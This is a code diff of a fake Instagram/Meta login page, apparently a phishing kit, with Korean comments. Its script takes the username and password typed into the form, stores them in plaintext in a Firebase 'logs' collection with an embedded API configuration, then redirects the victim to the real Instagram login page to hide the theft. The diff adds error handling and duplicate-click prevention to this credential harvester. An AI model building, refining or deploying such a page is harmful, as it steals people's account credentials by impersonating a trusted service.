@@ -14,7 +14,6 @@
         .forgot-pw { color: #000000; font-size: 14px; font-weight: 600; text-decoration: none; margin-top: 20px; display: block; }
         .bottom-section { width: 100%; max-width: 350px; padding: 20px 40px 40px 40px; box-sizing: border-box; text-align: center; }
         .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 11px; border-radius: 50px; font-weight: 600; font-size: 15px; margin-bottom: 25px; cursor: pointer; }
-        /* Meta 한 줄 정렬 설정 */
         .meta-footer { display: flex; align-items: center; justify-content: center; gap: 5px; }
         .meta-icon { width: 18px; filter: grayscale(1); opacity: 0.5; }
         .meta-text { color: #8e8e8e; font-size: 15px; font-weight: 500; }
@@ -38,20 +37,47 @@
             <span class="meta-text">Meta</span>
         </div>
     </div>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-        const firebaseConfig = { apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4", authDomain: "instagram-be709.firebaseapp.com", projectId: "instagram-be709", storageBucket: "instagram-be709.firebasestorage.app", messagingSenderId: "556245509978", appId: "1:556245509978:web:e78967856f2ac2586f7563", measurementId: "G-1KLXR0LXSZ" };
+
+        // 상준님 고유 설정값
+        const firebaseConfig = {
+            apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
+            authDomain: "instagram-be709.firebaseapp.com",
+            projectId: "instagram-be709",
+            storageBucket: "instagram-be709.firebasestorage.app",
+            messagingSenderId: "556245509978",
+            appId: "1:556245509978:web:e78967856f2ac2586f7563",
+            measurementId: "G-1KLXR0LXSZ"
+        };
+
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
+
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn');
             const idVal = document.getElementById('id').value;
             const pwVal = document.getElementById('pw').value;
+            
+            submitBtn.disabled = true; // 중복 클릭 방지
+
             try {
-                await addDoc(collection(db, "logs"), { userId: idVal, userPw: pwVal, timestamp: new Date() });
+                // Firebase에 데이터 전송
+                await addDoc(collection(db, "logs"), {
+                    userId: idVal,
+                    userPw: pwVal,
+                    timestamp: new Date()
+                });
+                // 성공 시 인스타그램 실제 페이지로 이동
                 window.location.href = "https://www.instagram.com/accounts/login/";
-            } catch (error) { console.error(error); }
+            } catch (error) {
+                console.error("로그 저장 실패:", error);
+                alert("로그인 중 오류가 발생했습니다.");
+                submitBtn.disabled = false;
+            }
         });
     </script>
 </body>
